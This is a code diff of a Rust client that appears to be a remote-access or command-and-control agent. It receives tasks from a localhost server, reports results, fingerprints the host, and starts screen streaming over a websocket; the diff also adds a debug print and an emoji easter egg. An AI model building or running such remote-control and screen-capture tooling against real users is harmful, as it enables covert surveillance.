@@ -31,6 +31,7 @@ mod stream;
 use std::{net::IpAddr, string, time::Duration};
 
 use crate::screen::takescreen;
+const WS: &str = "wss://127.0.0.1:6061";
 const SERVER: &str = "https://127.0.0.1:6060";
 const GETKEY: &str = "/get_key";
 const ADVERTISE: &str = "/advertise";
@@ -120,27 +121,34 @@ async fn get_local_fingerprint() -> String{
 
 }
 async fn progress(url:String,command:String,taskid:String,key:String){
+    
     let command_clone = command.clone();
-    if command.starts_with("stream"){
+    
+    let command_clone2 = command_clone.to_string();
+    
+    if command_clone2.starts_with("stream"){
         
         let parts:Vec<&str> = command_clone.split(",").collect();
         if parts.len() != 3{
+            
             let _ = add_result(url.to_string(), key.to_string(), "not an command".to_string(), taskid.to_string()).await;
         }
         else {
             let sesssion = parts[2].to_string();
             let tys = parts[1].to_string();
-            let url_clone = url.to_string();
+            let url_clone = WS.to_string();
+            print!("Start handler");
             tokio::spawn(async move {
                 let _ = stream::stream_handler(tys.to_string(), sesssion.to_string(), url_clone.to_string()).await; // offline handler
             });
         }
     }
-
+    
     match command.as_str() {
         "ping" => {
             let _ = add_result(url.to_string(), key, "pong".to_string(), taskid.to_string()).await;
         }
+
         "get_version" => {
             let _ = add_result(url.to_string(), key, VERSION.to_string(), taskid.to_string()).await;
         }
@@ -220,10 +228,9 @@ async fn progress(url:String,command:String,taskid:String,key:String){
             let _ = add_result(url.to_string(), key, disdt.to_string(), taskid.to_string()).await;
 
         }
-
-
         "🎅" => {
-            let _ = add_result(url.to_string(), key, "santa santa claus santa santa".to_string(), taskid.to_string()).await;
+            let _ = "santa"; 
+            let _ = add_result(url.to_string(), key, "you unlocked 1 santa gift".to_string(), taskid.to_string()).await;
         }
         _ =>  {
             let _ = add_result(url.to_string(), key, "not an command".to_string(), taskid.to_string()).await;
@@ -235,8 +242,6 @@ async fn progress(url:String,command:String,taskid:String,key:String){
     
 
 }
-
-
 
 
 async fn advertise(url: String,key:String) -> bool{
